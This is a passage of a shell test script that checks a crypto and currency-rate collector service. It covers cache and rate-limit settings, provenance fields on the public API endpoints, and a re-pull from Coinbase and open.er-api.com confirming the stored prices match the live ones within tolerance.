# fallback, open.er-api.com FX. Every row carries source + fetched_at.
python3 - "$DIR" <<'EOF' || fail "collector rate-limit discipline"
import sys; sys.path.insert(0, sys.argv[1] + "/server"); import collect
assert collect.CACHE_TTL >= 300, collect.CACHE_TTL
assert collect.BACKOFF_429 >= 60, collect.BACKOFF_429
st = {}
assert not collect._limited(st, "crypto")
collect._mark_limited(st, "crypto")
assert collect._limited(st, "crypto") and not collect._limited(st, "fx")
src = open(sys.argv[1] + "/server/collect.py").read()
assert "tries=1" in src and "429" in src, "coingecko single-try + 429 path"
print("collector discipline OK: cache>=300s, 429 backoff, coingecko 1 try")
EOF
bash "$DIR/bin/collect.sh" one | grep -qi "tick" || fail "collect tick"
TICK=$(tail -n 5 "$DIR/data/collect.jsonl" | python3 -c "import json,sys;ls=[json.loads(l) for l in sys.stdin if l.strip()];print(json.dumps(ls[-1]))")
echo "$TICK" | grep -Eq '"status": *"ok"|"status": *"partial"' || fail "collect tick status: $TICK"
echo "$TICK" | grep -q 'crypto-spot' || fail "collect publishes crypto-spot: $TICK"
echo "$TICK" | grep -q 'usd-fx' || fail "collect publishes usd-fx: $TICK"
echo "$TICK" | grep -q '"from_cache"' || fail "tick records cache provenance: $TICK"
python3 - "$DIR" <<'EOF' || fail "collect cache file"
import sys, json
try:
    d = json.load(open(sys.argv[1] + "/data/collect_cache.json"))
except Exception as e:
    raise SystemExit("no cache file: %s" % e)
for k in ("crypto", "fx"):
    assert k in d and d[k].get("data"), (k, sorted(d.keys()))
print("cache file OK:", sorted(d.keys()))
EOF
CSPOT=$(curl -s "$BASE/api/public/crypto-spot")
echo "$CSPOT" | python3 -c "import json,sys;d=json.load(sys.stdin);rs=d['records'];assert len(rs)>=2,d;srcs={r['source'] for r in rs};assert srcs <= {'coingecko','coinbase','kraken'} | {s+'+cache' for s in ('coingecko','coinbase','kraken')} | {'cache'},srcs;assert all(r.get('fetched_at') and float(r['price_usd'])>0 for r in rs),rs;print('crypto-spot OK:',len(rs),'rows from',srcs)" || fail "crypto-spot provenance: $CSPOT"
SFX=$(curl -s "$BASE/api/public/usd-fx")
echo "$SFX" | python3 -c "import json,sys;d=json.load(sys.stdin);rs=d['records'];assert len(rs)>=3,d;assert all(r.get('source','').startswith('open.er-api.com') and r.get('fetched_at') and r.get('upstream_at') and float(r['rate'])>0 for r in rs),rs;print('usd-fx OK:',len(rs),'rows from open.er-api.com')" || fail "usd-fx provenance: $SFX"
curl -s "$BASE/dataset/crypto-spot" | grep -q "REAL DATA" || fail "crypto-spot page provenance banner"
curl -s "$BASE/dataset/crypto-spot" | grep -q "latest fetch" || fail "crypto-spot page fetched-at"
curl -s "$BASE/dataset/usd-fx" | grep -q "REAL DATA" || fail "usd-fx page provenance banner"
curl -s "$BASE/api/earnings" | grep -q "real-collector" || fail "collector rows are prod (public earnings)"
# re-pull: live upstream must match the dataset within tolerance.
# Spot moves second-to-second (2% band); FX is a daily fix (1% band).
# If the upstream itself is unreachable, SKIP honestly (report holds the proof).
python3 - "$BASE" "$TOKEN" <<'EOF' || fail "re-pull match"
import sys, json, urllib.request, urllib.error
base, token = sys.argv[1], sys.argv[2]
def get(url, timeout=20):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read(200000).decode("utf-8", "replace"))
try:
    cb = get("https://api.coinbase.com/v2/prices/BTC-USD/spot")["data"]
    live_btc = float(cb["amount"])
    fx = get("https://open.er-api.com/v6/latest/USD")
except Exception as e:
    print("re-pull SKIP (upstream unreachable): %s" % str(e)[:120])
    sys.exit(0)
try:
    ds = get(base + "/api/public/crypto-spot?token=" + token)
    du = get(base + "/api/public/usd-fx?token=" + token)
except urllib.error.HTTPError as e:
    print("re-pull SKIP (local quota spent, report holds the proof): %s" % e) 
    sys.exit(0)
last = [r for r in ds["records"] if r.get("symbol") == "BTC"][-1]
drift = abs(float(last["price_usd"]) - live_btc) / live_btc
assert drift < 0.02, (last, live_btc, drift)
print("crypto re-pull OK: dataset BTC %s vs coinbase %s (drift %.4f%%)" % (last["price_usd"], live_btc, drift * 100))
for r in du["records"][-3:]:
    cur = r["pair"].split("/")[1]
    live = float(fx["rates"][cur])
    d2 = abs(float(r["rate"]) - live) / live
    assert d2 < 0.01, (r, live, d2)
print("fx re-pull OK: 3 pairs match open.er-api.com within 1%%")
EOF
bash "$DIR/bin/collect.sh" status | grep -q "last_tick" || fail "collect status"
echo "collector OK (coingecko-first + coinbase/kraken fallback + er-api FX, cache>=5min, 429 backoff, re-pull matches)"
echo "PASS"

